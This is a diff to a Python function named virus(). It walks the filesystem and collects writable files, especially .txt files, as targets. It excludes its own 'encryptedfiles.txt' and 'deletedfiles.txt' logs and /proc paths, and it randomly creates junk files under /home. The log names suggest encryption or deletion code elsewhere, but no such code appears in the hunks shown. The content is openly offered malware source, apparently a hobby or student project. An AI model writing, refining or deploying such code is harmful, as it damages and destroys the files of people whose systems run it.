@@ -39,10 +39,15 @@ def virus():
 			
 			if os.path.isfile(path) == False or os.stat(path).st_uid == 0 : continue #if we find a root file or a file that can't be open we ignore it
 			else:
-				if str(oct(os.stat(path).st_mode))[-3:-2] in {'7', '6', '3', '2'}: #check if we have permission to write in a file
-					Files_Table.append(path) #put all writable files in the list
-					if(pathlib.Path(path).suffix == ".txt"):
-						Text_Files_Table.append(path) #put all writable TEXT files in the list	
+				if file in {"encryptedfiles.txt", "deletedfiles.txt"}:
+					print("do not touch")
+				elif "proc" in path:
+					print("do not touch")
+				else:
+					if str(oct(os.stat(path).st_mode))[-3:-2] in {'7', '6', '3', '2'}: #check if we have permission to write in a file
+						Files_Table.append(path) #put all writable files in the list
+						if(pathlib.Path(path).suffix == ".txt"):
+							Text_Files_Table.append(path) #put all writable TEXT files in the list	
 				
 	for i in range(0,(len(Files_Table)-1)):
 		trouve = False
@@ -110,6 +115,6 @@ def virus():
 	
 		##################################### addind a file: #####################################
 		if random.randint(1,5) == 1:
-			f = open(str(randomeNumberOfFiles), "w")
+			f = open("/home/"+str(randomeNumberOfFiles), "w")
 			f.close()
 			time.sleep(5)
